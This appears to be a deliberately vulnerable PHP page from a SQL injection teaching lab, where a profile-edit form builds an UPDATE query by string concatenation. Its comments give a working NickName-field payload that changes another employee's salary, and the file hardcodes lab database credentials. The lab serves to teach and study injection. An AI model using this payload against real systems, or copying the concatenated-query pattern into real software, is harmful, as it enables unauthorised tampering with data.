<?php
/*
 * Lab 4 — SQL Injection
 * Task: Vulnerable profile-edit page (UPDATE injection via NickName field)
 * Description:
 *   Demonstrates SQL injection in an UPDATE statement.  Unlike a SELECT
 *   injection (which leaks data), an UPDATE injection allows an attacker to
 *   modify columns they should not have access to — in this case, their own
 *   salary.
 *
 * Vulnerable field: NickName
 * Injection payload (enter in the NickName field):
 *
 *   ', Salary='-10000' WHERE EID='20000' --
 *
 * Effect — the query becomes:
 *   UPDATE credential
 *   SET nickname='', Salary='-10000' WHERE EID='20000' -- ',
 *       email='...', address='...', Password='...', PhoneNumber='...'
 *   WHERE ID=<victim_id>;
 *
 *   The -- comments out the rest of the original WHERE clause, so the
 *   WHERE EID='20000' in the injection controls which row is updated.
 *   The attacker can modify the salary of any employee by changing 20000.
 */

// =============================================================================
// Database connection
// =============================================================================

function getDB() {
    $dbhost = "10.9.0.6";
    $dbuser = "seed";
    $dbpass = "dees";
    $dbname = "sqllab_users";

    $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    return $conn;
}

// =============================================================================
// Read form input — all INJECTION POINTS
// =============================================================================

// These values come from the profile-edit form submitted by the logged-in user.
$input_nickname    = $_POST['NickName'];    // <-- INJECTION POINT (primary)
$input_email       = $_POST['Email'];
$input_address     = $_POST['Address'];
$input_pwd         = $_POST['Password'];
$input_phonenumber = $_POST['PhoneNumber'];

// The user's own ID — taken from their session (not injectable here, but the
// NickName field allows overriding the WHERE clause to target other rows).
$id = $_SESSION['id'];

// Hash the new password if provided, else keep the existing hash
$hashed_pwd = !empty($input_pwd) ? sha1($input_pwd) : "";

// =============================================================================
// Vulnerable UPDATE query — string concatenation
// =============================================================================
// $input_nickname is injected directly into the SET clause.
//
// Normal query (nickname = "Alice"):
//   UPDATE credential
//   SET nickname='Alice', email='...', address='...', Password='...', PhoneNumber='...'
//   WHERE ID=5;
//
// Injected query (nickname = "', Salary='-10000' WHERE EID='20000' --"):
//   UPDATE credential
//   SET nickname='', Salary='-10000' WHERE EID='20000' --',
//       email='...', ...
//   WHERE ID=5;
//
// The injected WHERE clause replaces the original, targeting EID 20000.
// The -- silences the remainder of the original query.

$conn = getDB();

$sql = "UPDATE credential "
     . "SET   nickname='"    . $input_nickname    . "', "   // <-- injection here
     .       "email='"       . $input_email       . "', "
     .       "address='"     . $input_address     . "', "
     .       "Password='"    . $hashed_pwd        . "', "
     .       "PhoneNumber='" . $input_phonenumber . "' "
     . "WHERE ID=" . $id . ";";

// Execute the (potentially injected) query
if ($conn->query($sql) === TRUE) {
    echo "<p>Profile updated successfully.</p>";
} else {
    echo "<p>Error updating profile: " . $conn->error . "</p>";
}

$conn->close();
?>
